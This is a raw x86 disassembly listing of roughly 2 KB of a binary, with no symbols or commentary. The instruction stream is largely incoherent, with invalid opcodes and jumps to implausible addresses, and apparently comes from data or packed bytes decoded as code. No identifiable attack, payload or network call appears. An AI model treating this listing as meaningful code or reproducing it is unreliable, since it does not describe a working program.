  414ad9:	imul   edi,edx,0x74
  414adc:	dec    esi
  414add:	jne    0x414ab8
  414adf:	jb     0x414ac8
  414ae1:	popa   
  414ae2:	fst    DWORD PTR [esi+0x41]
  414ae5:	arpl   cx,sp
  414ae7:	pop    ebx
  414ae8:	adc    eax,0xe58dd04
  414aed:	jbe    0x414ac8
  414aef:	imul   eax,DWORD PTR [esi],0x77
  414af2:	adc    eax,0xe872d805
  414af7:	ins    DWORD PTR es:[edi],dx
  414af8:	mov    edx,0x106efa66
  414afd:	je     0x414a98
  414aff:	jb     0x414ae8
  414b01:	fs cdq 
  414b03:	push   esi
  414b04:	add    al,0x71
  414b06:	xchg   ebp,eax
  414b07:	jno    0x414af0
  414b09:	pop    eax
  414b0a:	xchg   esp,eax
  414b0b:	pop    ebx
  414b0c:	(bad)  
  414b0d:	pop    ebx
  414b0e:	xchg   BYTE PTR [eax+ebx*8],al
  414b11:	je     0x414b6c
  414b13:	push   edi
  414b14:	shr    DWORD PTR [edx+0x1d],cl
  414b17:	add    eax,0x665971ca
  414b1c:	mov    bl,0x5a
  414b1e:	fs push 0x0
  414b21:	jmp    0xcbaebd85
  414b26:	pop    eax
  414b27:	push   edi
  414b28:	add    BYTE PTR [eax-0x779b93a3],cl
  414b2e:	dec    edx
  414b2f:	add    eax,0x6c2d8672
  414b34:	imul   eax,DWORD PTR [eax-0x7793aa07],0x0
	...
  414b4b:	add    BYTE PTR [eax],dl
  414b4d:	push   0x6c26e972
  414b52:	jno    0x414ae1
  414b54:	ss jo  0x414b57
  414b57:	jns    0x414b64
  414b59:	inc    esp
  414b5a:	addr16 pop edx
  414b5c:	sbb    eax,0x1b617a05
  414b61:	pop    ebx
  414b62:	bound  eax,QWORD PTR [edi-0x2b]
  414b65:	add    al,0x71
  414b67:	dec    eax
  414b68:	int    0x57
  414b6a:	arpl   WORD PTR [ebp-0x2],dx
  414b6d:	outs   dx,DWORD PTR ds:[esi]
  414b6e:	addr16 push edx
  414b70:	aad    0x4
  414b72:	fs dec eax
  414b74:	fidiv  DWORD PTR [eax+0x5f]
  414b77:	cmp    dh,dh
  414b79:	imul   esi,DWORD PTR [edx+0xc],0x150072dd
  414b80:	aad    0x55
  414b82:	je     0x414ba1
  414b84:	popf   
  414b85:	push   ebp
  414b86:	je     0x414b71
  414b88:	int3   
  414b89:	inc    ebx
  414b8a:	jbe    0x414b98
  414b8c:	test   al,0x6b
  414b8e:	popa   
  414b8f:	adc    dh,dh
  414b91:	jno    0x414c01
  414b93:	or     al,0x9a
  414b95:	jno    0x414c0d
  414b97:	add    al,0xf6
  414b99:	push   0x68a0df5f
  414b9e:	add    ah,cl
  414ba0:	nop
  414ba1:	jo     0x414c10
  414ba3:	fistp  WORD PTR [ebp+eax*1+0x61]
  414ba7:	shl    DWORD PTR [edi+edx*2+0x61],0x0
  414bac:	retf   
  414bad:	pop    es
  414bae:	data16 jb 0x414bb1
	...
  414bc1:	add    dl,cl
  414bc3:	push   0x6e
  414bc5:	fs jecxz 0x414c30
  414bc8:	imul   esp,DWORD PTR [ebx+eiz*8+0x6b],0x61
  414bcd:	jae    0x414c36
  414bcf:	outs   dx,BYTE PTR ds:[esi]
  414bd1:	jns    0x414ba6
  414bd3:	inc    ecx
  414bd4:	imul   ebp,DWORD PTR [esi-0x7a],0x7
  414bd8:	imul   ebp,DWORD PTR [ecx-0x80],0x8c736b55
  414bdf:	imul   esi,DWORD PTR [eax+eax*1+0x61],0x51323215
  414be7:	adc    eax,0x66066200
  414bec:	bound  ebp,QWORD PTR [esi+esi*1+0x5c]
  414bf0:	add    BYTE PTR [ecx],dh
  414bf2:	loop   0x414c0d
  414bf4:	sub    eax,0x2d1a1231
  414bf9:	add    al,al
  414bfb:	aas    
  414bfc:	pop    edi
  414bfd:	popa   
  414bfe:	mov    al,0x3f
  414c00:	ins    BYTE PTR es:[edi],dx
  414c01:	popa   
  414c02:	push   ebx
  414c03:	inc    ecx
  414c04:	imul   esi,DWORD PTR [edx-0x39],0x69
  414c08:	outs   dx,BYTE PTR ds:[esi]
  414c09:	xor    dl,BYTE PTR [eax+0x7]
  414c0c:	gs ins BYTE PTR es:[edi],dx
  414c0e:	in     al,dx
  414c0f:	push   esi
  414c10:	popa   
  414c11:	addr16 in al,dx
  414c13:	add    BYTE PTR fs:[esi-0x4],ah
  414c17:	aas    
  414c18:	je     0x414c7c
  414c1a:	add    bh,BYTE PTR ds:0x3b13316c
  414c20:	imul   esi,DWORD PTR [esi+0xa],0x3f
  414c24:	arpl   WORD PTR [eax],ax
	...
  414c36:	add    BYTE PTR [eax],al
  414c38:	std    
  414c39:	imul   esi,DWORD PTR [eax+ebp*2+0x2],0x2e65003f
  414c41:	cmp    al,0x5d
  414c43:	outs   dx,BYTE PTR ds:[esi]
  414c44:	es fs ins BYTE PTR es:[edi],dx
  414c47:	add    dl,bh
  414c49:	mov    esi,0xce5d6d66
  414c4e:	ins    BYTE PTR es:[edi],dx
  414c4f:	add    BYTE PTR [ecx+eiz*4+0x66],bl
  414c53:	imul   ecx,DWORD PTR [ebp-0x36],0xcd49005f
  414c5a:	pop    eax
  414c5b:	imul   edx,DWORD PTR [ebx-0x14],0x58
  414c5f:	pop    edi
  414c60:	inc    edx
  414c61:	and    DWORD PTR [eax+0x6c],0x4e
  414c65:	in     al,dx
  414c66:	pop    ebx
  414c67:	pop    edi
  414c68:	sub    DWORD PTR [ebx+0x63200057],ecx
  414c6e:	pop    ecx
  414c6f:	outs   dx,BYTE PTR ds:[esi]
  414c70:	cli    
  414c71:	pushf  
  414c72:	je     0x414ca6
  414c74:	and    eax,0x834609f
  414c79:	in     al,dx
  414c7a:	arpl   WORD PTR [edi+0x18],bx
  414c7d:	push   ebp
  414c7e:	add    DWORD PTR [edx+0x1f],esi
  414c81:	push   eax
  414c82:	xor    esi,DWORD PTR [edx]
  414c84:	leave  
  414c85:	jmp    0x414cea
  414c87:	ins    BYTE PTR es:[edi],dx
  414c88:	fisttp DWORD PTR [ebp+0x58]
  414c8b:	pop    edi
  414c8c:	cli    
  414c8d:	cmp    esi,DWORD PTR [esi+0x67]
  414c90:	aam    0x4e
  414c92:	pop    edi
  414c93:	add    bl,ch
  414c95:	sbb    bl,BYTE PTR [edi+0x72]
  414c98:	into   
  414c99:	jmp    0x414d01
  414c9b:	push   0x0
	...
  414cac:	add    BYTE PTR [eax],al
  414cae:	xlat   BYTE PTR ds:[ebx]
  414caf:	pop    ds
  414cb0:	jne    0x414d15
  414cb2:	fucomi st,st(3)
  414cb4:	xor    BYTE PTR [ebx],dh
  414cb6:	pop    es
  414cb7:	mov    ecx,0x99b0030
  414cbc:	popa   
  414cbd:	arpl   WORD PTR [esi-0x6497fe44],bx
  414cc3:	fstp   QWORD PTR [ebp+0x61]
  414cc6:	(bad)  
  414cc7:	frstor [eax+0x0]
  414cca:	sahf   
  414ccb:	adc    BYTE PTR [esp+esi*2-0x69],ch
  414ccf:	fld    QWORD PTR [ecx]
  414cd1:	jno    0x414c6e
  414cd3:	add    al,0xdd
  414cd5:	pusha  
  414cd6:	xchg   esi,eax
  414cd7:	add    al,0x18
  414cd9:	xor    eax,0x371a1728
  414cde:	cli    
  414cdf:	ins    BYTE PTR es:[edi],dx
  414ce0:	enter  0x5657,0x72
  414ce4:	out    0x5d,eax
  414ce6:	cmp    eax,0x4860b756
  414ceb:	add    eax,0x6c5c64cb
  414cf0:	les    edx,FWORD PTR [edi+0x56]
  414cf3:	push   0x59555ee7
  414cf8:	xchg   ebx,eax
  414cf9:	pusha  
  414cfa:	and    al,0x5
  414cfc:	mov    ah,BYTE PTR [ebx+ebp*1+0x56]
  414d00:	and    BYTE PTR [eax-0x6],0x55
  414d04:	jnp    0x414d66
  414d06:	push   cs
  414d07:	jno    0x414c91
  414d09:	add    ecx,DWORD PTR [edx]
  414d0b:	push   edi
  414d0c:	mov    BYTE PTR [ecx+ebx*1+0x57],ch
  414d10:	out    0x5b,eax
	...
  414d22:	add    BYTE PTR [eax],al
  414d24:	pop    ss
  414d25:	pop    ecx
  414d26:	dec    ebx
  414d27:	pop    ecx
  414d28:	pop    ss
  414d29:	add    eax,0x68e45b56
  414d2e:	inc    esi
  414d2f:	jno    0x414d1c
  414d31:	add    al,0x3c
  414d33:	outs   dx,DWORD PTR ds:[esi]
  414d34:	jmp    0x414d8e
  414d36:	dec    ebx
  414d37:	pop    ebx
  414d38:	fld    DWORD PTR [esi+eax*2]
  414d3b:	arpl   si,cx
  414d3d:	cmp    al,BYTE PTR [si]
  414d40:	fsubr  DWORD PTR [ebx+0x3b]
  414d43:	pop    eax
  414d44:	fbld   TBYTE PTR [ebx+0x1b]
  414d47:	pop    edi
  414d48:	retf   
  414d49:	add    al,0x6
  414d4b:	pop    esp
  414d4c:	cwde   
  414d4d:	push   0x69fa5a1b
  414d52:	add    eax,0x146d905c
  414d57:	add    al,0xcd
  414d59:	push   ss
  414d5a:	mov    edx,0x1ac92f
  414d5f:	mov    esi,0xe93019e1
  414d64:	stc    
  414d65:	gs je  0x414d4a
  414d68:	xchg   DWORD PTR [edx+0x69],ebx
  414d6b:	into   
  414d6c:	outs   dx,DWORD PTR ds:[esi]
  414d6d:	outs   dx,DWORD PTR ds:[esi]
  414d6e:	jne    0x414d4c
  414d70:	stc    
  414d71:	ins    BYTE PTR es:[edi],dx
  414d72:	je     0x414d49
  414d74:	imul   ebx,DWORD PTR [ebx],0x5a6b162d
  414d7a:	jne    0x414d8b
  414d7c:	pop    ecx
  414d7d:	jno    0x414de1
  414d7f:	int3   
  414d80:	inc    edi
  414d81:	push   0x68
  414d83:	shl    bl,0x65
  414d86:	ins    DWORD PTR es:[edi],dx
  414d87:	xchg   esp,eax
	...
  414d98:	add    BYTE PTR [eax],al
  414d9a:	nop    DWORD PTR [eax]
  414d9d:	loope  0x414d88
  414d9f:	xor    DWORD PTR [eax-0x7a],esi
  414da2:	push   ebx
  414da3:	pop    eax
  414da4:	sub    eax,0x63591886
  414da9:	xlat   BYTE PTR ds:[ebx]
  414daa:	sub    DWORD PTR [ebp+0x70],ebp
  414dad:	jmp    0x79b5a6e3
  414db2:	fbstp  TBYTE PTR [ecx]
  414db4:	sub    eax,0x5f58148b
  414db9:	push   edi
  414dba:	sbb    dl,BYTE PTR [esi+0x6b]
  414dbd:	push   eax
  414dbe:	shl    BYTE PTR [ebx+0x2e],cl
  414dc1:	dec    eax
  414dc2:	jmp    0x6167:0xc24a6b71
  414dc9:	push   edx
  414dca:	add    BYTE PTR [esi+0x6d],ah
  414dcd:	add    esp,DWORD PTR [esi]
  414dcf:	adc    eax,0x54f2f938
  414dd4:	ins    DWORD PTR es:[edi],dx
  414dd5:	aas    
  414dd6:	shl    DWORD PTR [ecx],1
  414dd8:	gs or  dl,cl
  414ddb:	arpl   WORD PTR [esi],bp
  414ddd:	sbb    esi,edx
  414ddf:	push   esp
  414de0:	add    cl,ch
  414de2:	rcr    DWORD PTR [eax+0x74],1
  414de5:	sbb    esp,edx
  414de7:	xor    DWORD PTR ds:0x6f3fef00,ebp
  414ded:	jo     0x414e00
  414def:	aas    
  414df0:	pop    edi
  414df1:	jae    0x414e28
  414df3:	pop    edx
  414df4:	imul   ebp,DWORD PTR [edi],0x4e
  414df7:	adc    al,0x64
  414df9:	ja     0x414de0
  414dfb:	aas    
  414dfc:	js     0x414e63
	...
  414e0e:	add    BYTE PTR [eax],al
  414e10:	jecxz  0x414e4d
  414e12:	je     0x414e88
  414e14:	shl    DWORD PTR [ecx],cl
  414e16:	sub    ebp,DWORD PTR [edi]
  414e18:	mov    dl,0x59
  414e1a:	imul   esi,DWORD PTR gs:[edx-0x6f9994c3],0x3e
  414e22:	je     0x414e52
  414e24:	sar    BYTE PTR [ecx+ebp*2],0x2f
  414e28:	nop
  414e29:	pop    ss
  414e2a:	jbe    0x414e73
  414e2c:	outs   dx,BYTE PTR ds:[esi]
  414e2d:	imul   ebp,DWORD PTR [ebx+0x2e],0x7e
  414e31:	imul   esp,DWORD PTR [ecx+0x0],0x7b
  414e35:	outs   dx,DWORD PTR ds:[esi]
  414e36:	je     0x414ea8
  414e38:	leave  
  414e39:	cld    
  414e3a:	sub    dh,BYTE PTR [ebx+ecx*4+0x3e]
  414e3e:	push   0x6159116f
  414e43:	je     0x414dc7
  414e45:	cmp    ch,BYTE PTR [edi+ebp*2+0x1]
  414e49:	(bad)  
  414e4a:	pop    esi
  414e4b:	outs   dx,DWORD PTR ds:[esi]
  414e4c:	es clc 
  414e4e:	xor    dl,BYTE PTR [ecx-0x31]
  414e51:	sbb    al,0x2e
  414e53:	gs retf 
  414e55:	add    BYTE PTR gs:[eax],al
  414e58:	sub    dh,BYTE PTR [esi]
  414e5a:	inc    ebp
  414e5b:	push   eax
  414e5c:	cld    
  414e5d:	inc    esp
  414e5e:	inc    esi
  414e5f:	dec    ecx
  414e60:	daa    
  414e61:	inc    esi
  414e62:	xor    BYTE PTR [ecx-0x12],bl
  414e65:	and    DWORD PTR [eax+0x4b],edx
  414e68:	pop    ds
  414e69:	pop    ds
  414e6a:	inc    ebp
  414e6b:	dec    esp
  414e6c:	push   cs
  414e6d:	sbb    DWORD PTR [ebp+0x55],edx
  414e70:	jmp    0x0:0x595243
	...
  414e83:	add    BYTE PTR [eax],al
  414e85:	add    dl,bh
  414e87:	sbb    eax,0xbdbe4350
  414e8c:	dec    esp
  414e8d:	push   ebx
  414e8e:	mov    bl,0x9c
  414e90:	adc    esi,DWORD PTR [eax]
  414e92:	cli    
  414e93:	in     eax,dx
  414e94:	add    DWORD PTR [eax],eax
  414e96:	cli    
  414e97:	jmp    0x414e9a
  414e99:	dec    ebx
  414e9a:	mov    ch,0x29
  414e9c:	dec    edi
  414e9d:	(bad)  
  414e9e:	cli    
  414e9f:	in     eax,dx
  414ea0:	add    DWORD PTR [eax],eax
  414ea2:	cli    
  414ea3:	jmp    0x414ea6
  414ea5:	add    dl,bh
  414ea7:	call   0x5244:0x974e4636
  414eae:	aaa    
  414eaf:	test   al,0x38
  414eb1:	addr16 pop ecx
  414eb3:	call   0x5c6d:0xce5d7156
  414eba:	sub    eax,0x4d6453c5
  414ebf:	jg     0x414f33
  414ec1:	pop    esp
  414ec2:	cmp    DWORD PTR [ecx+0x6f],edi
  414ec5:	jb     0x414ede
  414ec7:	xchg   BYTE PTR [ebp+0x56],ch
  414eca:	pop    ds
  414ecb:	jp     0x414f3f
  414ecd:	addr16 or eax,0x24534576
  414ed3:	jne    0x414f28
  414ed5:	jno    0x414edd
  414ed7:	lea    edx,[ebp+0x6c]
  414eda:	cli    
  414edb:	js     0x414f30
  414edd:	addr16 or al,0x3b
  414ee0:	jo     0x414f41
  414ee2:	out    0x4f,al
  414ee4:	push   ecx
  414ee5:	je     0x414ecf
  414ee7:	inc    esp
  414ee8:	push   esi
  414ee9:	add    BYTE PTR gs:[eax],al
	...
  414efc:	cli    
  414efd:	daa    
  414efe:	pop    ebx
  414eff:	jno    0x414eeb
  414f01:	aaa    
  414f02:	arpl   WORD PTR [edi-0x3c],si
  414f05:	dec    esp
  414f06:	push   edi
  414f07:	arpl   dx,di
  414f09:	test   DWORD PTR [ebx],0x1ebfa00
  414f0f:	add    dl,bh
  414f11:	add    al,0xe7
  414f13:	add    esp,DWORD PTR [ebx-0x66a9e699]
  414f19:	jo     0x414ef5
  414f1b:	xor    esp,edx
  414f1d:	push   0x35fa57fb
  414f22:	sbb    edx,DWORD PTR [ebx-0x41]
  414f25:	addr16 repz inc esp
  414f28:	fwait
  414f29:	pop    eax
  414f2a:	add    BYTE PTR [esi-0x67],ch
  414f2d:	inc    ecx
  414f2e:	(bad)  
  414f2f:	push   ebp
  414f30:	mov    ebp,DWORD PTR [ebp-0x2d]
  414f33:	pusha  
  414f34:	dec    ebx
  414f35:	push   0x6e5572da
  414f3a:	lds    edi,FWORD PTR [esi+ebx*2]
  414f3d:	add    eax,0x624f71b7
  414f42:	int3   
  414f43:	jb     0x414f90
  414f45:	dec    esp
  414f46:	ret    
  414f47:	dec    edi
  414f48:	pop    edi
  414f49:	xor    cl,ah
  414f4b:	jb     0x414f98
  414f4d:	ins    BYTE PTR es:[edi],dx
  414f4e:	mov    esi,0xe7693555
  414f53:	add    edi,edx
  414f55:	add    al,0xe7
  414f57:	add    edi,edx
  414f59:	add    al,0xe7
  414f5b:	add    ebx,DWORD PTR [ebx]
  414f5d:	push   ebx
  414f5e:	nop
  414f5f:	jae    0x414f61
	...
  414f71:	add    BYTE PTR [esi],ah
  414f73:	adc    bh,BYTE PTR [ecx-0x748ee1eb]
  414f79:	add    edi,DWORD PTR [ebx]
  414f7b:	push   ebx
  414f7c:	jo     0x414ff1
  414f7e:	push   cs
  414f7f:	cmp    BYTE PTR [ebp+0x73],bh
  414f82:	or     BYTE PTR [esi+0x5b],ch
  414f85:	pop    edi
  414f86:	fistp  DWORD PTR [eax+0x23]
  414f89:	arpl   si,sp
  414f8b:	arpl   di,sp
  414f8d:	add    edi,edx
  414f8f:	add    al,0xe7
  414f91:	adc    eax,0x44c5cd9
  414f96:	stos   DWORD PTR es:[edi],eax
  414f97:	ins    DWORD PTR es:[edi],dx
  414f98:	inc    ebp
  414f99:	jo     0x414f62
  414f9b:	arpl   WORD PTR [eax],ax
  414f9d:	cmp    esp,DWORD PTR [ebp-0x5bbfaac0]
  414fa3:	xor    bh,BYTE PTR [edi]
  414fa5:	cmp    edi,esi
  414fa7:	outs   dx,DWORD PTR ds:[esi]
  414fa8:	jo     0x414fae
  414faa:	les    eax,FWORD PTR [edi+edi*8]
  414fad:	call   0x1b2d4ab
  414fb2:	mov    ebp,0xcbba6c70
  414fb7:	cs fs or eax,0x215104b2
  414fbe:	(bad)  
  414fbf:	popa   
  414fc0:	je     0x414fe9
  414fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fc3:	jo     0x415029
  414fc5:	int3   
  414fc6:	imul   esi,DWORD PTR ds:0x1c51d55f,0x0
  414fcd:	jmp    0xe94154cb
  414fd2:	je     0x414ff8
  414fd4:	aas    
  414fd5:	jmp    0x414fda
	...
  414fe6:	add    BYTE PTR [eax],al
  414fe8:	mov    esp,DWORD PTR [edi+edi*1]
  414feb:	jmp    0xe98074ab
  414ff0:	mov    cl,0x24
  414ff2:	aas    
  414ff3:	jmp    0xe9807497
  414ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ff9:	and    al,0x3f
  414ffb:	jmp    0xe9807eaf
  415000:	repnz cs aas 
  415003:	jmp    0xe9807ef3
  415008:	xlat   BYTE PTR ds:[ebx]
  415009:	cs aas 
  41500b:	jmp    0xe9807f46
  415010:	jp     0x415041
  415012:	aas    
  415013:	jmp    0xe9807f71
  415018:	stc    
  415019:	add    al,0x0
  41501b:	jmp    0x69415518
  415020:	fs fdiv st(5),st
  415023:	jmp    0x61a44c
  415028:	daa    
  415029:	xor    bl,BYTE PTR [edi+0x75]
  41502c:	mov    esi,0x746e3b
  415031:	add    ebp,edi
  415033:	call   DWORD PTR [ebx-0x78]
  415036:	sbb    al,BYTE PTR [eax]
  415038:	and    ecx,DWORD PTR [eax]
  41503a:	cmp    eax,0x5d451370
  41503f:	je     0x415033
  415041:	add    ch,bh
  415043:	call   DWORD PTR [ebx]
  415045:	mov    BYTE PTR [eax+eax*1],bl
  415048:	and    ecx,DWORD PTR [eax]
  41504a:	dec    esp
  41504b:	outs   dx,DWORD PTR ds:[esi]
	...
  41505c:	add    BYTE PTR [eax],al
  41505e:	add    BYTE PTR [eax+0x6c],ch
  415061:	and    dl,dl
  415063:	push   eax
  415064:	jo     0x4150aa
  415066:	repnz push esp
  415068:	pop    ebp
  415069:	add    dl,ah
  41506b:	pop    es
  41506c:	add    BYTE PTR [eax+0x103],al
  415072:	nop
  415073:	pop    di
  415075:	push   0xfffd07b6
  41507a:	jecxz  0x415003
  41507c:	sbb    eax,0x3f07e300
  415081:	outs   dx,DWORD PTR ds:[esi]
  415082:	mov    esp,0x8065653c
  415087:	pop    es
  415088:	std    
  415089:	jmp    DWORD PTR [ebx-0x5cffdd79]
  41508f:	pop    es
  415090:	dec    eax
  415091:	imul   eax,DWORD PTR [eax-0x758d9495],0xa3000207
  41509b:	xchg   DWORD PTR [ecx],eax
  41509d:	add    BYTE PTR [ebx-0x4c86b6f9],ah
  4150a3:	sbb    ebp,DWORD PTR [ebx+0x63]
  4150a6:	push   es
  4150a7:	xor    esp,DWORD PTR [ecx+0x6e]
  4150aa:	xlat   BYTE PTR ds:[ebx]
  4150ab:	xor    eax,DWORD PTR [eax]
  4150ad:	add    ah,BYTE PTR [ebx+0x7]
  4150b0:	and    BYTE PTR [ebx],0xfa
  4150b3:	in     eax,dx
  4150b4:	add    DWORD PTR [eax],eax
  4150b6:	mov    ecx,0xe56b6f1a
  4150bb:	xor    esp,DWORD PTR [edi+edi*1]
  4150be:	retf   0x481d
  4150c1:	pop    edi
	...
  4150d2:	add    BYTE PTR [eax],al
  4150d4:	into   
  4150d5:	dec    esp
  4150d6:	add    al,0xff
  4150d8:	cmp    eax,0xfa2581ed
  4150dd:	in     eax,dx
  4150de:	add    DWORD PTR [ebx-0x4d],ecx
  4150e1:	int    0x31
  4150e3:	addr16 cdq 
  4150e5:	stc    
  4150e6:	push   esi
  4150e7:	jb     0x415080
  4150e9:	inc    BYTE PTR [ebx]
  4150eb:	add    bh,dl
  4150ed:	in     eax,dx
  4150ee:	sub    DWORD PTR [esi],0x4101edfa
  4150f4:	xchg   ebp,eax
  4150f5:	add    BYTE PTR [edi+0x6d],ch
  4150f8:	mov    ebp,cs
  4150fa:	inc    ebp
  4150fb:	ins    DWORD PTR es:[edi],dx
  4150fc:	pop    ecx
  4150fd:	mov    ecx,0xb05c6370
  415102:	push   esi
  415103:	add    al,bh
  415105:	jmp    0x415108
  415107:	or     BYTE PTR ds:0x390001ec,0xb3
  41510e:	jo     0x41517b
  415110:	pop    ebp
  415111:	retf   0x3f21
  415114:	pop    esi
  415115:	shr    DWORD PTR [esi+ebp*2+0x53],0x9f
  41511a:	push   ebp
  41511b:	jb     0x415138
  41511d:	js     0x41518b
  41511f:	jbe    0x415138
  415121:	int3   
  415122:	xor    eax,0x5680156d
  415127:	add    bl,bh
  415129:	jmp    0x41512c
  41512b:	or     dl,0xeb
  41512e:	add    DWORD PTR [eax],eax
  415130:	cmp    eax,DWORD PTR [eax-0x7aeb9890]
  415136:	push   esi
  415137:	je     0x415139
	...
  415149:	add    BYTE PTR [eax],cl
  41514b:	lea    edx,[ebp+0x67]
  41514e:	in     al,dx
  41514f:	add    al,0x4c
  415151:	and    al,0xc6
  415153:	imul   ecx,DWORD PTR [esi+0x70],0x3e804eb
  41515a:	cli    
  41515b:	test   ah,ah
  41515d:	add    edi,edx
  41515f:	add    al,0x17
  415161:	imul   ecx,eax,0xa5724e55
  415167:	push   0x62cf36e7
  41516c:	xor    ebx,DWORD PTR [ebx-0x2b]
  41516f:	push   esi
  415170:	or     al,0x40
  415172:	shr    DWORD PTR [ebx+0xa],0x56
  415176:	xchg   edi,eax
  415177:	push   ebp
  415178:	push   es
  415179:	push   0xffffffa6
  41517b:	cmp    BYTE PTR [esi],dh
  41517d:	ins    DWORD PTR es:[edi],dx
  41517e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41517f:	pusha  
  415180:	push   ss
  415181:	pop    ebx
  415182:	mov    edi,DWORD PTR [eax]
  415184:	sub    bl,BYTE PTR [ecx-0x78]
  415187:	push   esi
  415188:	or     al,0x72
  41518a:	xchg   BYTE PTR [edx],dh
  41518c:	add    al,0x56
  41518e:	imul   ebp,DWORD PTR [esi+edx*8+0x71],0x4e
  415193:	inc    eax
  415194:	fist   WORD PTR [ebx+0x56]
  415197:	push   0xffffffd9
  415199:	push   0x6bba3968
  41519e:	pop    ecx
  41519f:	imul   edx,ebx,0xcb6a3423
  4151a5:	addr16 pop ecx
  4151a7:	push   edi
  4151a8:	mov    edx,0x9a4a2a03
  4151ad:	aaa    
	...
  4151be:	add    BYTE PTR [eax],al
  4151c0:	ficomp DWORD PTR [edi]
  4151c2:	call   0xd733:0xb3314223
  4151c9:	adc    eax,ebp
  4151cb:	adc    esi,ecx
  4151cd:	push   cs
  4151ce:	lahf   
  4151cf:	jb     0x4151dc
  4151d1:	push   ecx
  4151d2:	shl    DWORD PTR [ebx],0xd9
  4151d5:	push   ebp
  4151d6:	in     al,dx
  4151d7:	or     eax,0x8a0065c5
  4151dc:	adc    dl,BYTE PTR [ebp+0x74]
  4151df:	mov    bl,0x19
  4151e1:	das    
  4151e2:	sub    eax,0x3f0efd13
  4151e7:	dec    edx
  4151e8:	fbld   TBYTE PTR [ebp+0x70]
  4151eb:	pop    ebp
  4151ec:	or     eax,0xcb4a6e46
  4151f1:	pusha  
  4151f2:	addr16 push edi
  4151f4:	jecxz  0x415214
  4151f6:	and    BYTE PTR [eax-0x2e],dl
  4151f9:	outs   dx,BYTE PTR gs:[esi]
  4151fb:	cmp    eax,0xfd7750d1
  415200:	fldcw  WORD PTR [esi]
  415202:	cmp    DWORD PTR [eax],ebx
  415204:	or     eax,0xbef30b15
  415209:	outs   dx,BYTE PTR ds:[si]
  41520b:	sbb    eax,0xbc746a95
  415210:	lds    esp,FWORD PTR [ebp+0x6e]
  415213:	push   cs
  415214:	mov    dl,0x6c
  415216:	cmp    cl,cl
  415218:	fsubr  QWORD PTR [eax+0x73]
  41521b:	in     al,0xef
  41521d:	inc    ebx
  41521e:	ins    DWORD PTR es:[edi],dx
  41521f:	jmp    FWORD PTR [ebx+0x64]
  415222:	popa   
  415223:	fld    QWORD PTR [eax]
	...
  415235:	add    BYTE PTR [eax+0x6a],ah
  415238:	outs   dx,BYTE PTR ds:[esi]
  415239:	and    ebx,DWORD PTR [esi]
  41523b:	data16 ins BYTE PTR es:[edi],dx
  41523d:	mov    BYTE PTR [esi+0x64],0xb
  415241:	jecxz  0x415281
  415243:	push   0x6e
  415245:	mov    ebp,0xc746754
  41524a:	add    dl,BYTE PTR [eax+0x70]
  41524d:	int3   
  41524e:	fbld   TBYTE PTR [edi+ebx*2]
  415251:	mov    ecx,0x8a676949
  415256:	sbb    BYTE PTR [ecx+0x67],dl
  415259:	mov    gs,WORD PTR [ebx]
  41525b:	sub    ch,BYTE PTR [ebp-0x76]
  41525e:	inc    ebp
  41525f:	fs je  0x41521e
  415262:	cs push ecx
  415264:	jb     0x415266
  415266:	jle    0x4152cb
  415268:	imul   ecx,DWORD PTR ds:0x6e6b4189,0x746e5eff
  415272:	mov    dh,0x3f
  415274:	outs   dx,BYTE PTR ds:[esi]
  415275:	arpl   sp,ax
  415277:	ins    BYTE PTR es:[edi],dx
  415278:	outs   dx,BYTE PTR gs:[esi]
  41527a:	mov    esp,0xba621ff6
  41527f:	push   edx
  415280:	pop    ebp
  415281:	jb     0x41522d
  415283:	pop    es
  415284:	or     dl,BYTE PTR [ebp+0x10]
  415287:	pusha  
  415288:	jb     0x4152b7
  41528a:	adc    ch,BYTE PTR [esi+0x61]
  41528d:	outs   dx,BYTE PTR ds:[esi]
  41528e:	push   esi
  415290:	pop    ds
  415291:	dec    ebp
  415292:	hlt    
  415293:	ss gs ins BYTE PTR es:[edi],dx
  415296:	pop    es
  415297:	sub    esi,DWORD PTR fs:[eax+eax*1]
	...
  4152ab:	add    BYTE PTR ds:0xf0281ff4,dh
  4152b1:	push   ebp
  4152b2:	imul   esi,DWORD PTR [eax+0x2],0xe762653d
  4152b9:	pop    edi
  4152ba:	aaa    
  4152bb:	and    dh,dl
  4152bd:	adc    DWORD PTR [ebp+0x45],eax
  4152c0:	xor    ebp,edi
  4152c2:	sub    eax,0x5323a830
  4152c7:	imul   eax,ebp,0xc0776b5f
  4152cd:	and    esi,DWORD PTR ds:0xa07fa38
  4152d3:	or     eax,0x6f3f03d9
  4152d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152d9:	das    
  4152da:	popa   
  4152db:	outs   dx,BYTE PTR ds:[esi]
  4152dc:	(bad)  
  4152dd:	es dec esp
  4152df:	gs mov ch,0x6c
  4152e2:	je     0x41534c
  4152e4:	test   eax,0x806f4c03
  4152e9:	bound  esi,QWORD PTR [ecx+ebp*2+0x74]
  4152ed:	push   ebp
  4152ee:	cmp    al,BYTE PTR [eax]
  4152f0:	cli    
  4152f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152f2:	inc    esi
  4152f3:	push   esp
  4152f4:	fcmovb st,st(0)
  4152f6:	push   esp
  4152f7:	and    BYTE PTR [edx+0x7a],al
  4152fa:	xor    eax,0x2f9cd550
  4152ff:	xor    bh,ch
  415301:	jecxz  0x41534c
  415303:	ins    DWORD PTR es:[edi],dx
  415304:	jmp    0x17616e5a
  415309:	cmp    ecx,DWORD PTR [edi]
  41530b:	or     bh,BYTE PTR [ebx+0x63614a]
	...
  415321:	add    dl,ch
  415323:	cmp    DWORD PTR [edx],ebx
  415325:	and    BYTE PTR [eax],ah
  415327:	xlat   BYTE PTR ds:[ebx]
  415328:	daa    
  415329:	or     eax,DWORD PTR [eax]
  41532b:	sub    eax,0x1ddf6161
  415330:	pop    eax
  415331:	sub    esi,DWORD PTR [edi-0x61929ec1]
  415337:	inc    esp
  415338:	outs   dx,BYTE PTR ds:[esi]
  415339:	gs lock int 0x6c
  41533d:	fs lahf 
  41533f:	pop    es
  415340:	pop    eax
  415341:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  415343:	hlt    
  415344:	das    
  415345:	and    al,ah
  415347:	mov    dl,0x54
  415349:	cmp    ecx,edx
  41534b:	rol    BYTE PTR [edi],1
  41534d:	inc    ecx
  41534e:	xchg   ebp,eax
  41534f:	pop    es
